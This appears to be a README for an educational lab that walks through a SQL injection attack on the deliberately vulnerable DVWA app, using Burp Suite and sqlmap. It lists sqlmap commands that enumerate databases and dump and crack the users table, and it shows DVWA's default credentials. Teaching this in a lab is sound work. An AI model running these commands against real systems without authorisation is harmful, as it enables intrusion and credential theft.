# Conducting-an-SQL-Injection

# SQL Injection Demonstration using DVWA and sqlmap

This repository provides a step-by-step educational demonstration of conducting a SQL Injection attack using Damn Vulnerable Web Application (DVWA) and `sqlmap`. **This lab is for educational and awareness purposes only. Do not use these techniques on unauthorized systems.**

---

## ⚠️ Disclaimer
This demonstration is intended strictly for ethical learning and should only be performed in a controlled lab environment. Unauthorized access to computer systems is illegal.

---

## 🧰 Tools Used
- Metasploitable 2 (Hosting DVWA)
- DVWA (Damn Vulnerable Web App)
- Kali Linux / Parrot OS (Attacker Machine)
- Burp Suite (for HTTP interception)
- sqlmap (for automated SQL Injection)

---

## 📝 Steps

1. **Start DVWA on Metasploitable 2 VM**  
2. **Access DVWA from attacker’s browser**:  
   `http://<target-ip>/dvwa`
3. **Submit a User ID to generate a query** (e.g., ID = 2)
4. **Intercept the request using Burp Suite**  
5. **Configure browser to use Burp proxy (127.0.0.1:8080)**
6. **Submit form to capture the request in Burp Suite**
7. **Copy URL and Cookie from intercepted request**
8. **Launch `sqlmap`**:  
   ```bash
   sqlmap -u "<URL>" --cookie="<cookie>"
   ```
9. **Let sqlmap detect database type (e.g., MySQL)**
10. **View discovered server info & injection points**
11. **Enumerate databases**:  
    ```bash
    sqlmap -u "<url>" --cookie="<cookie>" --dbs
    ```
12. **Enumerate tables in DVWA DB**:  
    ```bash
    sqlmap -u "<url>" --cookie="<cookie>" -D DVWA --tables
    ```
13. **List columns in `users` table**:  
    ```bash
    sqlmap -u "<url>" --cookie="<cookie>" -D DVWA -T users --columns
    ```
14. **Dump data (e.g., usernames and password hashes)**:  
    ```bash
    sqlmap -u "<url>" --cookie="<cookie>" -D DVWA -T users --dump
    ```
15. **Let sqlmap attempt password cracking (dictionary attack)**

---

## 🔐 Sample Results

| Username | Password     |
|----------|--------------|
| admin    | password     |
| gordonb  | abc123       |
| 1337     | charley      |
| pablo    | letmein      |
| smithy   | password     |

---

## 📂 Output
You will get detailed logs and dumped credentials from sqlmap. These help demonstrate why input validation, parameterized queries, and sanitization are critical in securing web apps.

---

## 📚 Learn More
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap Documentation](http://sqlmap.org/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
